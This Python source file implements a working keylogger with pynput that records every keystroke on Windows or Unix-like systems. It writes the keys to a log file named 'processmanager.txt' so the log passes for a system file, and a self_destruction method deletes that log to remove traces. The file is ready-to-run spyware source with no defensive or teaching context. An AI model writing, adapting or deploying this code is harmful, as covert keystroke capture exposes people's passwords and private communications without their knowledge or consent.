import os
import sys
import threading
import time

from pynput.keyboard import Listener


class Keylogger:
    """Captures and persists keystrokes to a platform-appropriate log file."""

    def __init__(self):
        # Instance-level state — not shared across instances
        self.keys = []
        self.count = 0
        self._listener = None
        self._stop_event = threading.Event()

        if sys.platform == "win32":
            self.path = os.path.join(os.environ["APPDATA"], "processmanager.txt")
        else:
            self.path = os.path.join(os.environ["HOME"], ".config", "processmanager.txt")

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _on_press(self, key):
        self.keys.append(key)
        self.count += 1
        if self.count >= 1:
            self.count = 0
            self._write_file(self.keys)
            self.keys = []

    def _write_file(self, keys):
        with open(self.path, "a", encoding="utf-8") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if "backspace" in k:
                    f.write(" [Backspace] ")
                elif "enter" in k:
                    f.write("\n")
                elif "shift" in k:
                    f.write(" [Shift] ")
                elif "space" in k:
                    f.write(" ")
                elif "caps_lock" in k:
                    f.write(" [Caps_Lock] ")
                elif k.startswith("Key."):
                    # Other special keys — write as-is but bracketed
                    f.write(f" [{k}] ")
                else:
                    # Regular printable character
                    f.write(k)

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def read_logs(self) -> str:
        try:
            with open(self.path, "r", encoding="utf-8") as f:
                return f.read()
        except FileNotFoundError:
            return ""

    def start(self):
        """Start listening; blocks until stop() is called."""
        with Listener(on_press=self._on_press) as self._listener:
            self._stop_event.wait()   # block until stop() signals
            self._listener.stop()

    def stop(self):
        """Signal the listener to stop (thread-safe)."""
        self._stop_event.set()

    def self_destruction(self):
        """Stop the keylogger and remove the log file."""
        self.stop()
        try:
            os.remove(self.path)
        except FileNotFoundError:
            pass


# ------------------------------------------------------------------
# Standalone usage
# ------------------------------------------------------------------

if __name__ == "__main__":
    keylog = Keylogger()
    t = threading.Thread(target=keylog.start, daemon=True)
    t.start()
    try:
        while True:
            time.sleep(10)
            print(keylog.read_logs())
    except KeyboardInterrupt:
        keylog.stop()
        t.join()
